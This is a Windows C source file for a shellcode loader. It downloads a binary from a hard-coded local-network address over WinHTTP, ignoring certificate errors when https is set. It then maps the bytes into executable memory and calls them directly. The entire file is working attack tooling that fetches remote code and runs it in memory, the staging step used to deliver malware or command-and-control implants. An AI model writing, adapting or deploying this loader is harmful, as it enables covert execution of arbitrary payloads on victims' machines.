#define UNICODE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <psapi.h>
#include <wchar.h>
#include <tchar.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ntdll")

wchar_t PROTOCOL[6] = L"http";
wchar_t IP[50] = L"192.168.214.84";
short PORT = (short)80;
wchar_t PATH[50] = L"/test.bin";

unsigned char* buf = NULL;
int capacity = 0;
DWORD size = 0;

void append(unsigned char element) {
    // Check if the array is full
    if (size == capacity) {
        // Increase the capacity of the array
        capacity += 1;  // Increase the capacity by a fixed amount (e.g., 10)
        unsigned char* newArray = (unsigned char*)realloc(buf, capacity * sizeof(char));
        if (newArray == NULL) {
            // Reallocation failed
            // Handle the error
            printf("Memory reallocation failed");
            return;
        }
        buf = newArray;  // Update the pointer to the newly allocated memory
    }

    // Append the element to the array
    buf[size] = element;
    size++;
}

int DL()
{
    printf("\n[*] Downloading %ls://%ls:%d%ls\n", PROTOCOL, IP, PORT, PATH);
    int counter = 0;

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    DWORD initFlag = 0;
    DWORD dwFlags = 0;

    if (wcscmp(PROTOCOL, L"https") == 0)
    {
        initFlag = WINHTTP_FLAG_SECURE;
        dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession)
        hConnect = WinHttpConnect(hSession, IP, PORT, 0);

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", PATH, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, initFlag);

    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
    {
        exit(443);
    }

    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());
                break;
            }

            if (!dwSize)
                break;

            pszOutBuffer = (LPSTR)malloc(dwSize + 1);

            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                break;
            }

            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                dwSize, &dwDownloaded))
            {
                return GetLastError();
            }
            else
            {
                int i = 0;
                while (i < dwSize)
                {
                    append(pszOutBuffer[i]);
                    counter++;
                    i++;
                }
            }
            free(pszOutBuffer);
            if (!dwDownloaded)
                break;

        } while (dwSize > 0);
    }
    else
    {
        return GetLastError();
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return 0;
}

int main()
{
    DWORD rez = DL();
    printf("[*] Executing with Direct Pointer\n");

    HANDLE mem_handle = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, size + 1, NULL);

    void* mem_map = MapViewOfFile(mem_handle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0x0, 0x0, size + 1);

    memcpy(mem_map, buf, size);

    ((int(*)())mem_map)();

}
